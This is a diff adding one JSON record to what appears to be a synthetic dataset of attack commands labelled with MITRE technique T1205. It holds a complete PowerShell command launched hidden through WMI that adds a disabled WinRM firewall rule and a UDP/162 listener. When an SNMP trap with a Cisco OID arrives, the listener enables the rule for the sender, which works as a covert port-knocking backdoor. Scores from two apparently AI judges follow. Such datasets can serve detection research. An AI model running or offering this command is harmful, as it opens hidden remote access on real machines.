@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(162); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $trapTag=$false; foreach($b in $d){ if($b -eq 0xA7){ $trapTag=$true; break } }; $oid=[byte[]](0x2b,0x06,0x01,0x04,0x01,0x09); $hit=$false; for($i=0;$i -le $d.Length-$oid.Length;$i++){ $ok=$true; for($j=0;$j -lt $oid.Length;$j++){ if($d[$i+$j] -ne $oid[$j]){$ok=$false;break} }; if($ok){$hit=$true;break} }; if($trapTag -and $hit){ Set-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+  "explanation": "Watches SNMP traps on UDP/162 and checks for a v2c/v3 Trap PDU (0xA7) containing a Cisco enterprise OID prefix (1.3.6.1.4.1.9 in BER encoding). This device-specific signal enables a WinRM rule for the trap source.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5985.",
+    "Listen for SNMP Trap PDUs and scan for Cisco enterprise OID bytes.",
+    "Enable the firewall rule restricted to the trap sender upon detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-544a1818",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell/WMI invocation is well-formed with balanced braces and parentheses, correctly escaped single quotes, and valid cmdlet/parameter usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly implements Traffic Signaling by passively parsing SNMP trap bytes on UDP/162 and enabling a targeted WinRM firewall rule upon a specific signal, but it requires administrative rights to modify firewall rules despite claiming no privilege.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T16:39:59.104093Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax, balanced quotes (properly escaped for the ArgumentList), valid flag formats, and logical flow constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the described traffic signaling technique by listening for specific SNMP trap patterns (PDU type 0xA7 and a Cisco OID) to trigger the activation of a WinRM firewall rule, demonstrating operational plausibility and direct alignment with T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:40:22.160399Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
